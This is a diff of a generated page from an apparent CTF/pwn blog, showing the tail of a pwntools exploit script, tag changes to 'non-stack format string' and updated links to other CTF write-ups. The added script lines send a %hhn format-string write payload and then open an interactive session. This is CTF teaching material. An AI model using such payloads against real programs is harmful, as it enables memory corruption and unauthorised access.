+r<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">b'input your data ;)\n'</span><span class="token punctuation">,</span> <span class="token string">'%'</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span><span class="token number">0xb1</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'c%45$hhn\x00'</span><span class="token punctuation">)</span>
+
+r<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
 
                 
             </div>
@@ -602,12 +638,8 @@ num_bytes = num.to_bytes(2, byteorder=&#39;little&#39;)		#转换为字节序列
                     
                         <div class="article-tag">
                             
-                                <a href="/tags/pwn/">
-                                    <span class="chip bg-color">pwn</span>
-                                </a>
-                            
-                                <a href="/tags/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/">
-                                    <span class="chip bg-color">格式化字符串</span>
+                                <a href="/tags/%E9%9D%9E%E6%A0%88%E4%B8%8A%E7%9A%84%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/">
+                                    <span class="chip bg-color">非栈上的格式化字符串</span>
                                 </a>
                             
                         </div>
@@ -651,46 +683,48 @@ num_bytes = num.to_bytes(2, byteorder=&#39;little&#39;)		#转换为字节序列
 <article id="prenext-posts" class="prev-next articles">
     <div class="row article-row">
         
-        <div class="article col s12 m6" data-aos="fade-up">
+        <div class="article col s12 m6" data-aos="fade-up" data-aos="fade-up">
             <div class="article-badge left-badge text-color">
-                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
+                <i class="far fa-dot-circle"></i>&nbsp;本篇
+            </div>
             <div class="card">
-                <a href="/2023/07/12/leetcode-shua-ti-chi-xu-geng-xin/leetcode-shua-ti-chi-xu-geng-xin/">
+                <a href="/2023/08/06/2023-syctf-harde-pwn/2023-syctf-harde-pwn/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/27.jpg" class="responsive-img" alt="leetcode刷题（持续更新)">
+                        <img src="/medias/featureimages/19.jpg" class="responsive-img" alt="2023_syctf_harde_pwn复现">
                         
-                        <span class="card-title">leetcode刷题（持续更新)</span>
+                        <span class="card-title">2023_syctf_harde_pwn复现</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
                     <div class="summary block-with-text">
                         
-                            leetcode刷题记录
+                            2023 syctf harde pwn复现
                         
                     </div>
                     <div class="publish-info">
-                        <span class="publish-date">
-                            <i class="far fa-clock fa-fw icon-date"></i>2023-07-12
-                        </span>
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2023-08-06
+                            </span>
                         <span class="publish-author">
                             
                             <i class="fas fa-bookmark fa-fw icon-category"></i>
                             
-                            <a href="/categories/%E7%AE%97%E6%B3%95/" class="post-category">
-                                    算法
+                            <a href="/categories/pwn/" class="post-category">
+                                    pwn
                                 </a>
                             
                             
                         </span>
                     </div>
                 </div>
+
                 
                 <div class="card-action article-tags">
                     
-                    <a href="/tags/%E7%AE%97%E6%B3%95/">
-                        <span class="chip bg-color">算法</span>
+                    <a href="/tags/%E9%9D%9E%E6%A0%88%E4%B8%8A%E7%9A%84%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/">
+                        <span class="chip bg-color">非栈上的格式化字符串</span>
                     </a>
                     
                 </div>
@@ -704,31 +738,31 @@ num_bytes = num.to_bytes(2, byteorder=&#39;little&#39;)		#转换为字节序列
                 下一篇&nbsp;<i class="fas fa-chevron-right"></i>
             </div>
             <div class="card">
-                <a href="/2023/05/22/how2heap/how2heap-chi-xu-geng-xin-ing/">
+                <a href="/2023/08/03/ciscn-dbgnote/ciscn-dbgnote/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/9.jpg" class="responsive-img" alt="how2heap(持续更新ing）">
+                        <img src="/medias/featureimages/25.jpg" class="responsive-img" alt="2023_ciscn_dbgnote复现">
                         
-                        <span class="card-title">how2heap(持续更新ing）</span>
+                        <span class="card-title">2023_ciscn_dbgnote复现</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
                     <div class="summary block-with-text">
                         
-                            基于堆的漏洞利用
+                            2023ciscnb区域半决赛dbgnote复现
                         
                     </div>
                     <div class="publish-info">
                             <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2023-05-22
+                                <i class="far fa-clock fa-fw icon-date"></i>2023-08-03
                             </span>
                         <span class="publish-author">
                             
                             <i class="fas fa-bookmark fa-fw icon-category"></i>
                             
-                            <a href="/categories/heap/" class="post-category">
-                                    heap
+                            <a href="/categories/pwn/" class="post-category">
+                                    pwn
                                 </a>
                             
                             
@@ -738,12 +772,12 @@ num_bytes = num.to_bytes(2, byteorder=&#39;little&#39;)		#转换为字节序列
                 
                 <div class="card-action article-tags">
                     
-                    <a href="/tags/pwn/">
-                        <span class="chip bg-color">pwn</span>
+                    <a href="/tags/envp/">
+                        <span class="chip bg-color">envp</span>
                     </a>
                     
-                    <a href="/tags/heap/">
-                        <span class="chip bg-color">heap</span>
+                    <a href="/tags/tls/">
+                        <span class="chip bg-color">tls</span>
                     </a>
                     
                 </div>
